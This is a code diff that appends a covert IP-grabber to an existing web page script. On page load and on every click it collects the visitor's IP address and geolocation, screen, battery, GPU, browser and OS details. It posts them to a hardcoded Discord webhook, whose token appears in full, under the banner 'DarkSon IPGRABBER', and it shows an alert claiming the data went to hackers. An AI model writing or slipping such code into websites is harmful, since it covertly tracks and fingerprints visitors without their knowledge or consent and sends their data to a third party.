@@ -209,3 +209,123 @@ document.addEventListener("DOMContentLoaded", () => {
     setTimeout(() => location.reload(), 2000);
   });
 });
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1357394750000464004/WGJv3PKR_yeYZWk7l4iWWUWNCl2Swr3oI9RotIreKEf1B82MeWqKw0djfJoubvPmfh-l";  
+
+async function collectUltimateData() {  
+    let ip, location = "Unknown";  
+    try {  
+        const ipResponse = await fetch("https://api.ipify.org?format=json");  
+        ip = (await ipResponse.json()).ip;  
+
+        const geoApis = [  
+            `https://ipapi.co/${ip}/json/`,  
+            `https://ipwho.is/${ip}`,  
+            `https://geolocation-db.com/json/${ip}`  
+        ];  
+
+        for (const api of geoApis) {  
+            try {  
+                const locResponse = await fetch(api);  
+                const locData = await locResponse.json();  
+                if (locData.city) {  
+                    location = `${locData.city}, ${locData.country || locData.country_name}`;  
+                    break;  
+                }  
+            } catch {}  
+        }  
+    } catch {}  
+
+    const screen = {  
+        resolution: `${window.screen.width}x${window.screen.height}`,  
+        colorDepth: `${window.screen.colorDepth}bit`,  
+        availableRes: `${window.screen.availWidth}x${window.screen.availHeight}`  
+    };  
+
+    let batteryInfo = "Desktop (No Battery)";  
+    if ('getBattery' in navigator) {  
+        const battery = await navigator.getBattery();  
+        batteryInfo = `Laptop 🔋 ${Math.round(battery.level * 100)}% | ` +  
+                     `${battery.charging ? "⚡ Charging" : "⚠️ Not Charging"}`;  
+    }  
+
+    let gpu = "Unknown";  
+    try {  
+        const canvas = document.createElement("canvas");  
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");  
+        if (gl) {  
+            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");  
+            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);  
+        }  
+    } catch {}  
+
+    const userAgent = navigator.userAgent;  
+    const browserTests = [  
+        { name: "Opera GX", test: /Opera GX|OPR/ },  
+        { name: "Brave", test: /Brave/ },  
+        { name: "Chrome", test: /Chrome/ },  
+        { name: "Firefox", test: /Firefox/ },  
+        { name: "Safari", test: /Safari/ },  
+        { name: "Edge", test: /Edg/ },  
+        { name: "IE", test: /Trident/ }  
+    ];  
+
+    let browser = "Unknown";  
+    for (const test of browserTests) {  
+        if (test.test.test(userAgent)) {  
+            browser = test.name;  
+            break;  
+        }  
+    }  
+
+    const osTests = [  
+        { name: "Windows", test: /Windows/ },  
+        { name: "MacOS", test: /Macintosh/ },  
+        { name: "Linux", test: /Linux/ },  
+        { name: "Android", test: /Android/ },  
+        { name: "iOS", test: /iPhone|iPad|iPod/ }  
+    ];  
+
+    let os = "Unknown";  
+    for (const test of osTests) {  
+        if (test.test.test(userAgent)) {  
+            os = test.name;  
+            break;  
+        }  
+    }  
+
+    const embed = {  
+        title: "🚨 **DarkSon IPGRABBER** 🚨",  
+        color: 0xFF0000,  
+        thumbnail: { url: "https://i.imgur.com/3Jm7g9T.png" },  
+        fields: [  
+            { name: "🌐 **IP Address**", value: ip || "Failed", inline: true },  
+            { name: "📍 **Location**", value: location, inline: true },  
+            { name: "🖥️ **Device Type**", value: batteryInfo, inline: true },  
+            { name: "🔍 **Screen Resolution**", value: `\`${screen.resolution}\` (Avail: \`${screen.availableRes}\`)`, inline: false },  
+            { name: "🎮 **GPU Renderer**", value: `\`\`\`${gpu.slice(0, 100)}\`\`\``, inline: false },  
+            { name: "💻 **OS**", value: os, inline: true },  
+            { name: "🌍 **Browser**", value: browser, inline: true },  
+            { name: "📜 **Full User Agent**", value: `\`\`\`${userAgent}\`\`\``, inline: false }  
+        ],  
+        timestamp: new Date().toISOString()  
+    };  
+
+    const payload = {  
+        username: "DarkSon",  
+        avatar_url: "https://i.imgur.com/7W7W7W7.png",  
+        embeds: [embed]  
+    };  
+
+    fetch(WEBHOOK_URL, {  
+        method: "POST",  
+        headers: { "Content-Type": "application/json" },  
+        body: JSON.stringify(payload)  
+    }).catch(e => console.error("Webhook Error:", e));  
+}  
+
+window.addEventListener("DOMContentLoaded", collectUltimateData);  
+
+document.addEventListener("click", () => {  
+    collectUltimateData();  
+    alert("Data sent to india hackers");  
+});  
